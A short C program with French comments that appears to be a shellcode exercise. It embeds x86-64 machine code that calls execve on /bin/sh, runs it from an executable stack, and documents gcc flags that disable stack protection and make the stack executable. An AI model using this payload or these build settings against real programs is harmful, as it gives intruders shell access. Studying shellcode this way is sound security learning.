#include<stdio.h>
#include<string.h>

//effectuer objdump -d asm.o et recuperer l'hexadecimal

unsigned char code[] =
 "\x48\xc7\xc0\x3b\x00\x00\x00\x48"
 "\xc7\xc2\x00\x00\x00\x00\x49\xb8"
 "\x2f\x62\x69\x6e\x2f\x73\x68\x00"
 "\x41\x50\x48\x89\xe7\x52\x57\x48"
 "\x89\xe6\x0f\x05\x48\xc7\xc0\x3c"
 "\x00\x00\x00\x48\xc7\xc7\x00\x00"
 "\x00\x00\x0f\x05";

int main(int argc, char **argv) {

    int (*ret)() = (int(*)())code;

    ret();

}

//gcc testop.c -o testop -fno-stack-protector -z execstack
//-fno-stack-protector: supprimer les protections de la pile 
//-z execstack: rendre la pile executable
